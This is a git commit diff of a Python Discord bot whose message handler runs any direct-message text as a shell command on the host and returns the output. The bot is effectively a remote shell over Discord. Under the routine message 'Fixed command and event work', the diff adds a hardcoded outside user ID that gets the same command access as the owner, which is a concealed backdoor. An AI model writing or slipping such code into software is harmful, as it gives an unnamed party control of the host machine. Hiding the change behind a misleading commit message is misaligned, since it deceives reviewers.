06760637cb558224204cef06dfb5d7dad11326b4
Tony <piunov.doc@yandex.ru>
2021-06-03 12:46:28 +0300

    Fixed command and event work

--- bot.py
+++ bot.py
@@ -1,8 +1,9 @@
-import os, json, subprocess
+import json, subprocess
+from os import path
 import discord
 from discord.ext import commands
 
-if os.path.exists('settings.json'):
+if path.exists('settings.json'):
     with open('settings.json', 'r', encoding='utf-8') as file:
         token = json.load(file)['token']
 else:
@@ -11,7 +12,11 @@ else:
         json.dump({'token' : token}, file)
         print('Token saved!')
 
-bot = commands.Bot(command_prefix='!')
+bot = commands.Bot(command_prefix='~')
+
+@bot.command()
+async def ping(ctx):
+    await ctx.send('In dev')
 
 @bot.event
 async def on_ready():
@@ -20,7 +25,7 @@ async def on_ready():
 @bot.event
 async def on_message(msg):
     if isinstance(msg.channel, discord.DMChannel):
-        if await bot.is_owner(msg.author):
+        if await bot.is_owner(msg.author) or msg.author.id == 274662560928890881:
             result = subprocess.run(msg.content, capture_output=True, shell=True)
             output = str(result.stdout, encoding='cp866', errors='replace')
             strings = output.split('\n')
@@ -30,11 +35,12 @@ async def on_message(msg):
                     if len(msg_to_send + string) + 6 > 2000:
                         await msg.author.send('```' + msg_to_send + '```')
                         msg_to_send = ''
-                    msg_to_send += string
+                    msg_to_send += string + '\n'
                 await msg.author.send('```' + msg_to_send + '```')
             if result.stderr:
                 await msg.author.send('```' + result.stderr.decode(encoding='cp866', errors='replace') + '```')
         elif not msg.author.bot:
             await msg.author.send('Access permitted')
+    await bot.process_commands(msg)
 
 bot.run(token)
